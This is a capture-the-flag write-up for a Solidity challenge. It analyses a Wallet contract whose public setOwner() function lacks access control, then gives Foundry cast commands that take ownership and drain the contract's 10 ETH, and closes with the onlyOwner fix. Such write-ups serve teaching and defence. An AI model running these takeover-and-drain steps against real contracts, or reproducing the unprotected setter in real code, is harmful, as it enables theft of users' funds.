- [Smart Contract CTF Writeup](#smart-contract-ctf-writeup)
  - [1. Source Code Analysis](#1-source-code-analysis)
    - [1.1 Setup.sol](#11-setupsol)
    - [1.2 Wallet.sol](#12-walletsol)
  - [2. Vulnerability Analysis](#2-vulnerability-analysis)
    - [2.1 Exploitation Using Cast](#21-exploitation-using-cast)
  - [3. Prevention Measures](#3-prevention-measures)


# Smart Contract CTF Writeup

## 1. Source Code Analysis
This challenge provides two source code files including `Wallet.sol` and `Setup.sol`.

### 1.1 Setup.sol
```solidity
pragma solidity 0.8.0;

import "./Wallet.sol";

contract Setup {
    Wallet public wallet;

    constructor() payable{
        wallet = (new Wallet){value : 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return address(wallet).balance == 0;
    }
}
```
The Setup contract deploys a Wallet contract with 10 ETH and we can query the Wallet address via the public `wallet` variable. The success condition is that the Wallet balance reaches 0.

### 1.2 Wallet.sol
```solidity
pragma solidity 0.8.0;

contract Wallet {
    address owner;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() payable {
        require(msg.value == 10 ether);
        owner = msg.sender;
    }

    function withdraw(address payable beneficiary) public onlyOwner {
        beneficiary.transfer(address(this).balance);
    }

    function setOwner() public {
        owner = msg.sender;
    }
}
```
The Wallet contract uses an internal variable `owner` to control who can withdraw funds. The `withdraw()` function can transfer all ETH to a beneficiary address, protected by `onlyOwner` modifier - which means, only the owner can call this function. However, the `setOwner()` function is set to be public without any access control like protection with `onlyOwner` modifier.

## 2. Vulnerability Analysis
The vulnerability exists in the `setOwner()` function in `Wallet.sol`. It allows anyone to call the function and become the owner.

```solidity
function setOwner() public {
    owner = msg.sender;
}
```

**Attack Vector**
1. Call `setOwner()` to be become the owner
2. Call `withdraw(attacker_address)` to drain all funds

### 2.1 Exploitation Using Cast
> Cast is a command-line tool from Foundry that allows direct interaction with smart contracts, without the need to write Solidity code

**Given Information**
1. Private Key (attacker's account)
2. Setup Address (entry point contract)
3. RPC URL (blockchain node endpoint)

**Attack Step**
1. **Set up enviroment variable for convenience**
    ```bash
    export PRIVATE_KEY=XX
    export RPC_URL=YY
    export SETUP_ADDRESS=ZZ
    ```

2. **Query the address and balance of the attacker's account**
    ```bash
    ATTACKER_ADDRESS=$(cast wallet address --private-key $PRIVATE_KEY)
    echo "Attacker's address: $ATTACKER_ADDRESS"
    cast balance $ATTACKER_ADDRESS --rpc-url $RPC_URL
    ```
    The result shows that the initial balance of attacker's account is 100 ETH.

3. **Query the address and balance of the `Wallet` contract**
    To note: since `cast call` returns 32 bytes of raw data, we need to manually convert it to the correct address format by removing the leading zeros
    ```bash
    cast call $SETUP_ADDRESS "wallet()" --rpc-url $RPC_URL
    export WALLET_ADDRESS=QQ
    cast balance $WALLET_ADDRESS --rpc-url $RPC_URL
    ```
    The result shows that the initial balance of the `Wallet` is 10 ETH.
    
4. **Call `setOwner()` to make the attacker become the owner of the `Wallet` contract**
    ```bash
    cast send $WALLET_ADDRESS "setOwner()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```

5. **Call `withdraw()` to drain the funds from the `Wallet`**
    ```bash
    cast send $WALLET_ADDRESS "withdraw(address)" $ATTACKER_ADDRESS --private-key $PRIVATE_KEY --rpc-url $RPC_URL
    ```

6. **Verify the balance and check if the challenge is solved**
    ```bash
    cast balance $ATTACKER_ADDRESS --rpc-url $RPC_URL
    cast balance $WALLET_ADDRESS --rpc-url $RPC_URL
    cast call $SETUP_ADDRESS "isSolved()" --rpc-url $RPC_URL
    ```

**Result**
The result shows that the balance of the `Wallet` becomes 0 while the balance of the attacker's account becomes 109.9999943029 ETH (with gas consumption). The `isSolved()` return 1 (true), confirming that the attack sucessfully drains the funds from the `Wallet`.

## 3. Prevention Measures
The original Wallet contract lacks access control and allows any user to become the contract owner. One approach to mitigate the vulnerability is to apply the modifier `onlyOwner` to the `setOwner()` function.